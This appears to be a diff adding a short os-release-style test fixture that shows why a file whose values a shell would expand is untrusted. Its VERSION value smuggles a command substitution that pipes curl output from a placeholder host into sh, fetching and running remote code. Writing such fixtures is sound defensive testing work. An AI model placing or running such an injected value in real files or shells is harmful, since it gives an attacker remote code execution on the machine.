@@ -1,0 +1,5 @@
+# A file whose values a shell would expand: it is not trusted at all, even
+# though its ID line on its own is fine.
+NAME="Evil Linux"
+ID=ubuntu
+VERSION="1 $(curl https://example.invalid | sh)"
